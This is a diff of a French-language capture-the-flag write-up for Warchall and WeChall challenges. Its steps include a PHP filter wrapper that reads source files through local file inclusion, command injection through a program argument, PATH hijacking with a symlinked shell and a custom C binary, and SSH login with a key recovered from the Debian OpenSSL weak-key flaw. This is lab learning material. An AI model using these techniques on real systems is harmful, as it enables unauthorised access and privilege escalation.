@@ -66,7 +66,9 @@ ALWAYS KEEP A JOKER.
 - d'après les precédentes challenges qu'on a vu, la solution est souvent stockée dans un fichier README ou solution
 - si on essaie de changer **en** ou **de** en **solution.php** pour accéder à la solution, la solution n'y est pas encore 
 -  on utilise donc un wrapper de php pour pouvoir lire l'intégralité du fichier solution.php en utilisant le codage en base64
->wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
+```
+wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
+```
 - on change le **en** ou **de** dans l'URL en ce wrapper PHP 
 - une suite de caractères en sous forme d'ASCII s'affichent et on le copie
 - on va dans un autre site qui permet de décoder un base64 et on cole dessus la suite de caractères
@@ -79,7 +81,9 @@ ALWAYS KEEP A JOKER.
 - si on clique sur le premier lien, on se retrouve dans la page précedente en anglais et si on clique sur le deuxieme lien, on se retrouve sur une page similaire mais en allemand. Tous deux avec des URL différents à partir du caractère **=** dans l'URL
 - si on change en **solution.php** les caractères après **=**, on accède à une page mais la solution n'y est pas 
 -  on utilise donc un wrapper de php pour pouvoir lire l'intégralité du fichier solution.php en utilisant le codage en base64
->wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
+```
+wrapper PHP : php://filter/convert.base64-encode/resource=solution.php
+```
 - on remplace par ce wrapper PHP le contenu de l'URL après **=** 
 - une suite de caractères en sous forme d'ASCII s'affichent et on le copie
 - on va dans un autre site qui permet de décoder un base64 et on cole dessus la suite de caractères
@@ -91,16 +95,22 @@ ALWAYS KEEP A JOKER.
 - cependant avec **ls -al** on peut voir que ce fichier ne peut pas être executé par d'autres utilisateurs
 - contrairement à cela un autre fichier charp peut 
 - on peut donc envisager une méthode similaire à l'injection pour avoir la solution avec :
->./charp "solution.txt | cat solution.txt > ~/solution10.txt"
+```
+./charp "solution.txt | cat solution.txt > ~/solution10.txt"
+```
 - puis on affiche le contenu du fichier **solution10.txt** avec **cat /home/user/jennifer/solution10.txt** ou simplement avec **cat ~/solution10.txt**
 - la solution ou notre flag se trouve dedans
 
 ##Choose your path2
 - après avoir examiné la fonction dans le code source
 - on peut créer un lien symbolique dans notre répertoire personnel avec :
-> ln -s /bin/sh ~/wc
+```
+ln -s /bin/sh ~/wc
+```
 - puis on modifie la variable d'environnement afin d'inclure uniquement le répertoire personnel où se trouve notre lien symbolique **wc** avec :
-> PATH=~ ./charp2 "/bin/cat solution.txt 1>&2" 
+```
+PATH=~ ./charp2 "/bin/cat solution.txt 1>&2" 
+ ```
 - la solution s'affiche
 
 ##Py-Tong
@@ -111,20 +121,72 @@ ALWAYS KEEP A JOKER.
 - pour se faire on utilise un fichier virtuel qui est un fichier *temporaire*  à l'aide du commande **<()**
 - puisqu'on veut un contenu temporaire il suffit d'écrire quelque chose sur ce fichier avec la commande **echo**
 - donc sur le terminal, on saisit:
->./pytong <(echo "SearchingForFlag")
+```
+./pytong <(echo "SearchingForFlag")
+```
 - la solution s'affiche automatiquement
 
 ##SSH...Z is sleeping
 - on peut trouver la clé publique de level08 dans **/home/level/08_sshz/backups/authorized_keys.backup**, il nous faut donc trouver la clé privée pour s'authentifier en level08
 - pour se faire, on utilise
->ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup
-
+```
+ssh-keygen -l -E md5 -f /home/level/08_sshz/backups/authorized_keys.backup
+```
 afin de voir si on peut obtenir l'empreinte du clé public ssh en md5 et exploiter une des vulnérabilités de l'empreinte md5(la même empreinte sur la clé publique et sur clé privée)
 - puis sur le site https://hdm.io/tools/debian-openssl/ on peut voir un fichier zip https://hdm.io/tools/debian-openssl/debian_ssh_rsa_2048_x86.tar.bz2
 - après le téléchargement et l'extraction de ce zip on peut accéder à plusieurs fichiers contenant des clés privées et ayant des noms sous forme de md5 mais sans les **:**
 - on cherche donc dessus **2bcd07a701e94a0474d77ee4d6d0f806** (l'empreinte sans les **:** obtenus à partir de la commande avec la clé publique) 
 - on obient alors un fichier de ce même nom et on l'envoie dans notre répértoire personnel dans warchall avec :
->scp -P 19198 C:\Users\Jenny\Downloads\rsa\2048\2bcd07a701e94a0474d77ee4d6d0f80 -23669 jennifer@warchall.net:/home/user/jennifer
+```
+scp -P 19198 C:\Users\Jenny\Downloads\rsa\2048\2bcd07a701e94a0474d77ee4d6d0f80 -23669 jennifer@warchall.net:/home/user/jennifer
+```
 - puis de retour sur le serveur on s'identifie avec le chemin de la clé privée:
->ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198
+```
+ssh -i ~/2bcd07a701e94a0474d77ee4d6d0f806-23669 level08@warchall.net -p 19198
+```
 - la solution s'affiche
+
+##Warchall:Tryouts
+- après avoir analysé le code source de ce challenge, on  peut en conclure que la fonction consiste à donner la solution après 3 entrées correctes des chiffres donné par /dev/urandom(ce qui est vraiment difficile à faire)
+- donc pour exploiter la faille de cela, on crée notre propre fichier **cat** dans notre répertoire personnel qui va lire un fichier et renvoyer e contenu lit dans un autre fichier
+- le cat que j'ai choisit d'utiliser :
+```
+#include <stdio.h>
+#include <unistd.h>
+#include <string.h>
+int main(int argc, char *argv[]) {
+    FILE *fp = fopen(argv[1], "w");
+    char buf[16];
+    memset(buf, 0, sizeof buf);
+    lseek(3, 0, SEEK_SET);
+    read(3, buf, sizeof buf);
+    fprintf(fp, "%s", buf);
+    return 0;
+}
+```
+-afin d'utiliser ce cat on doit d'abord le compiler avec :
+```
+jennifer@warchall:~$ gcc -m32 cat.c -o cat
+```
+- puis on execute le code ci-dessous afin d'inclure notre répertoire personnel: 
+```
+jennifer@warchall:export PATH=$HOME:$PATH
+```
+- puis pour executer ce cat, on fait :
+```
+jennifer@warchall:~$ ./cat
+```
+- après on va sur le challenge **cd /home/level/matrixman/13_tryouts/** et on fait :
+```
+./tryouts
+^C
+```
+- on change ensuite la variable d'environnement en :
+```
+export PATH=$PATH
+```
+- enfin on execute la commande :
+```
+nano ~/seed
+```
+- la solution y est
